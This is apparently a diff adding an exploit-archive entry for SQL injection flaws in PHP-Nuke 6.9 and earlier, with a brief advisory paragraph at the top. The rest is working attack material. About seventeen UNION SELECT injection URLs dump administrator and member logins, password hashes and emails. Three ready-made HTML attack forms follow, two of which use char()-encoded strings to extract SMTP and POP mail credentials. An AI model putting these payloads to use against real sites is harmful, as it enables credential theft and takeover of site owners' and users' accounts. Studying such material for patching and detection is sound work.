@@ -1,0 +1,134 @@
+source: http://www.securityfocus.com/bid/9544/info
+
+Multiple SQL injection vulnerabilities have been reported in various modules included in PHP-Nuke versions 6.9 and earlier. These issues could permit remote attackers to compromise PHP-Nuke administrative accounts. Other attacks may also be possible, such as gaining access to sensitive information.
+
+Some of these issues may overlap with previously reported SQL injection vulnerabilities in PHP-Nuke, but have all been reportedly addressed in PHP-Nuke 7.0.
+
+- http://www.example.com/modules.php?name=Web_Links&l_op=viewlink&cid=1%20UNION%20
+SELECT%20pwd,0%20FROM%20nuke_authors%20LIMIT%201,2
+
+- http://www.example.com/modules.php?name=Web_Links&l_op=viewlink&cid=0%20UNION%20SEL
+ECT%20pwd,0%20FROM%20nuke_authors
+
+- http://www.example.com/modules.php?name=Web_Links&l_op=brokenlink&lid=0%20UNION
+%20SELECT%201,aid,name,pwd%20FROM%20nuke_authors
+Display the login, the name and the password of an administrator if
+the link 0 does not exist.
+
+- http://www.example.com/modules.php?name=Web_Links&l_op=visit&lid=-1%20UNION%20
+SELECT%20pwd%20FROM%20nuke_authors
+Re-steer towards the encrypted password.
+
+- http://www.example.com/modules.php?name=Web_Links&l_op=viewlinkcomments&lid=-1%20
+UNION%20SELECT%20aid,1,pwd,1%20FROM%20nuke_authors/*
+Display all the logins administrator as well as their
+encrypted passwords.
+
+- http://www.example.com/modules.php?name=Web_Links&l_op=viewlinkeditorial&lid=-1
+%20UNION%20SELECT%20name,1,pwd,aid%20FROM%20nuke_authors
+Display logins, names and encrypted passwords of all the administrators.
+
+- http://www.example.com/modules.php?name=Downloads&d_op=viewdownload&cid=-1%20
+UNION%20SELECT%20user_id,username,user_password%20FROM%20nuke_users/*
+Display all the pseudos of the users, followed by their encrypted password.
+
+- http://www.example.com/modules.php?name=Downloads&d_op=modifydownloadrequest&
+lid=-1%20UNION%20SELECT%200,username,user_id,user_password,name,
+user_email,user_level,0,0%20FROM%20nuke_users
+Display logins, ID, encrypted passwords, names, emails and levels of
+all the registered members.
+
+- http://www.example.com/modules.php?name=Downloads&d_op=getit&lid=-1%20UNION%20
+SELECT%20user_password%20FROM%20nuke_users%20WHERE%20user_id=5
+
+- http://www.example.com/modules.php?name=Downloads&d_op=rateinfo&lid=-1%20UNION%20
+SELECT%20user_password%20FROM%20nuke_users%20WHERE%20user_id=5
+Re-steer towards the encrypted password of the user id of which is 5.
+
+- http://www.example.com/modules.php?name=Downloads&d_op=viewdownloadcomments&
+lid=-1%20UNION%20SELECT%20username,user_id,user_password,1%20
+FROM%20nuke_users/*
+
+- http://www.example.com/modules.php?name=Downloads&d_op=viewdownloadeditorial&lid=-1
+%20UNION%20SELECT%20username,1,user_password,user_id%20FROM%20nuke_users
+Display logins, ID and encrypted password of all the members.
+
+- http://www.example.com/modules.php?name=Sections&op=listarticles&secid=-1%20UNION
+%20SELECT%20pwd%20FROM%20nuke_authors
+
+- http://www.example.com/modules.php?name=Sections&op=listarticles&secid=-1%20UNION
+%20SELECT%200,0,pwd,0,0%20FROM%20nuke_authors%20WHERE%201/*
+
+- http://www.example.com/modules.php?name=Sections&op=printpage&artid=-1%20UNION%20
+SELECT%20aid,pwd%20FROM%20nuke_authors
+
+- http://www.example.com/modules.php?name=Sections&op=viewarticle&artid=-1%20UNION%20
+SELECT%200,0,aid,pwd,0%20FROM%20nuke_authors
+
+- http://www.example.com/modules.php?name=Reviews&rop=showcontent&id=-1%20UNION%20
+SELECT%200,0,aid,pwd,email,email,100,pwd,url,url,10000,name%20FROM%20nuke_autho
+rs/*
+
+--------------------PHPNUKEexploit1.html--------------------
+<html>
+<head><title>PHP-Nuke 6.9 SQL Injection Vulnerability Exploit</title></head>
+<body>
+<form method="POST" action="http://[target]/modules.php?name=Sections">
+<input type="hidden" name="op" value="printpage">
+<input type="text" name="artid" value="-1 UNION SELECT
+CONCAT(name,char(58),aid),pwd FROM nuke_authors">
+<input type="submit">
+</form>
+<p align="right">A patch can be found on <a
+href="http://www.phpsecure.info" target="_blank">phpSecure.info</a><br>
+For more informations about this exploit :
+<a href="http://www.security-corporation.com/advisories-026.html"
+target="_blank"> Security-Corporation.com</a></p>
+</body>
+</html>
+--------------------PHPNUKEexploit1.html--------------------
+
+--------------------PHPNUKEexploit2.html--------------------
+<html>
+<head><title>PHP-Nuke 6.9 SQL Injection Vulnerability Exploit</title></head>
+<body>
+<form method="POST" action="http://[target]/modules.php?name=Downloads">
+<input type="hidden" name="d_op" value="viewdownloadeditorial">
+<input type="text" name="lid" value="-1 UNION SELECT
+config_name,0,config_value,0 FROM nuke_bbconfig where
+config_name=char(115,109,116,112,95,104,111,115,116) OR
+config_name=char(115,109,116,112,95,117,115,101,114,110,97,109,101) OR
+config_name=char(115,109,116,112,95,112,97,115,115,119,111,114,100)">
+<input type="submit">
+</form>
+<p align="right">A patch can be found on <a
+href="http://www.phpsecure.info" target="_blank">phpSecure.info</a><br>
+For more informations about this exploit :
+<a href="http://www.security-corporation.com/advisories-026.html"
+target="_blank"> Security-Corporation.com</a></p>
+</body>
+</html>
+--------------------PHPNUKEexploit2.html--------------------
+
+
+--------------------PHPNUKEexploit3.html--------------------
+<html>
+<head><title>PHP-Nuke 6.9 SQL Injection Vulnerability Exploit</title></head>
+<body>
+<form method="POST" action="http://[target]/modules.php?name=Downloads">
+<input type="hidden" name="d_op" value="viewdownloadeditorial">
+<input type="text" name="lid" value="-1 UNION SELECT
+char(120),NOW(),char(32),CONCAT(char(60,98,114,62,76,111,103,105,110,32,58,3
+2),uname,char(60,98,114,62,60,98,114,62,80,97,115,115,119,111,114,100,32,58,
+32),passwd,char(60,98,114,62))
+FROM nuke_popsettings">
+<input type="submit">
+</form>
+<p align="right">A patch can be found on <a
+href="http://www.phpsecure.info" target="_blank">phpSecure.info</a><br>
+For more informations about this exploit :
+<a href="http://www.security-corporation.com/advisories-026.html"
+target="_blank"> Security-Corporation.com</a></p>
+</body>
+</html>
+--------------------PHPNUKEexploit3.html-------------------- 
